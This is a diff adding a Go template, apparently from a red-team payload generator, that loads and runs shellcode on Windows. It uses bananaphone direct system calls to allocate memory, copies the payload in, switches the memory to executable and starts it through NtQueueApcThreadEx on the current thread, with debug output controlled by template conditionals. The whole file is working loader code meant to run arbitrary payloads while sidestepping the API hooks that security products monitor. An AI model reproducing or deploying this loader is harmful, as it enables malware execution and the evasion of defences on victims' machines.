@@ -1,0 +1,137 @@
+func run(shellcode []byte) {
+
+	const (
+		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
+		memCommit  = uintptr(0x00001000)
+		memreserve = uintptr(0x00002000)
+	)
+
+	const (
+		QUEUE_USER_APC_FLAGS_NONE = iota
+		QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
+		QUEUE_USER_APC_FLGAS_MAX_VALUE
+	)
+
+	{{if .Debug}}
+	printDebug("info","Loading bananaphone")
+	{{end}}
+
+	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
+	if e != nil {
+		{{if .Debug}}
+		printDebug("error","Error calling NewBananaPhone:\n%s", e)
+		{{end}}
+		return
+	}
+
+	alloc, e := bp.GetSysID("NtAllocateVirtualMemory")
+	if e != nil {
+		{{if .Debug}}
+		printDebug("error","Error calling GetSysID:\n%s", e)
+		{{end}}
+		return
+	}
+
+	protect, e := bp.GetSysID("NtProtectVirtualMemory")
+	if e != nil {
+		{{if .Debug}}
+		printDebug("error","Error calling GetSysID:\n%s", e)
+		{{end}}
+		return
+	}
+
+	ntQueueApcThreadEx, e := bp.GetSysID("NtQueueApcThreadEx")
+	if e != nil {
+		{{if .Debug}}
+		printDebug("error","Error calling GetSysID:\n%s", e)
+		{{end}}
+		return
+	}
+
+	var r1 uint32
+	var r error
+	var baseA uintptr
+
+	{{if not .Debug}}
+	_ = r
+	_ = r1
+	{{end}}
+
+	{{if .Debug}}
+	printDebug("info","Try to allocate memory")
+	{{end}}
+	regionsize := uintptr(len(shellcode))
+	r1, r = bananaphone.Syscall(
+		alloc, //ntallocatevirtualmemory
+		thisThread,
+		uintptr(unsafe.Pointer(&baseA)),
+		0,
+		uintptr(unsafe.Pointer(&regionsize)),
+		uintptr(memCommit|memreserve),
+		syscall.PAGE_READWRITE,
+	)
+	if r != nil {
+		{{if .Debug}}
+		printDebug("error","Error calling ntallocatevirtualmemory: %s %x", r, r1)
+		{{end}}
+		return
+	}
+	{{if .Debug}}
+	printDebug("debug","Allocated %d bytes", len(shellcode))
+	{{end}}
+
+	{{if .Debug}}
+	printDebug("info","Copying shellcode to memory...")
+	{{end}}
+	/*_, _, errMemCpy := memcpy.Call(baseA, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+
+	if errMemCpy != nil && errMemCpy != syscall.Errno(0) {
+		{{if .Debug}}
+		printDebug("error","Error calling memcpy:\r\n%s", errMemCpy.Error())
+		{{end}}
+		return
+	}*/
+
+	bananaphone.WriteMemory(shellcode, baseA)
+
+	{{if .Debug}}
+	printDebug("info","Try to change memory protection to PAGE_EXECUTE_READ")
+	{{end}}
+	oldprotect := syscall.PAGE_READWRITE
+	r1, r = bananaphone.Syscall(
+		protect, //NtProtectVirtualMemory
+		thisThread,
+		uintptr(unsafe.Pointer(&baseA)),
+		uintptr(unsafe.Pointer(&regionsize)),
+		syscall.PAGE_EXECUTE_READ,
+		uintptr(unsafe.Pointer(&oldprotect)),
+	)
+	if r != nil {
+		{{if .Debug}}
+		printDebug("error","Error calling NtProtectVirtualMemory: %s %x", r, r1)
+		{{end}}
+		return
+	}
+	{{if .Debug}}
+	printDebug("info","Try to execute the shellcode")
+	{{end}}
+	handle := uintptr(syscall.Handle(windows.CurrentThread()))
+	{{if .Debug}}
+	printDebug("debug", "Got handle to current thread: %v", handle)
+	{{end}}
+	r1, r = bananaphone.Syscall(ntQueueApcThreadEx, handle, 0x1, uintptr(baseA), 0, 0, 0)
+
+	if r != nil {
+		{{if .Debug}}
+		printDebug("error","Error calling ntQueueApcThreadEx: %s %x", r, r1)
+		{{end}}
+		return
+	}
+
+	{{if .Debug}}
+	printDebug("info","Queued special user APC")
+	{{end}}
+	{{if .Debug}}
+	printDebug("info","Shellcode Executed")
+	{{end}}
+}
